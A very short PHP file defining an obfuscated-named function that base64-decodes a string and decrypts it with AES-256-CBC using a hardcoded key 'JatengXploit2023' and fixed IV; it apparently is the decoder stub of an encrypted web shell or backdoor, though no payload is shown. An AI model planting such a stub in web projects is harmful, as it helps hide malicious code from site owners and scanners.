<?php
function e7061($e){
	$ed = base64_decode($e);
	$n = openssl_decrypt("$ed","AES-256-CBC","JatengXploit2023",0,"0183736181827263");
	return $n;
}
?>
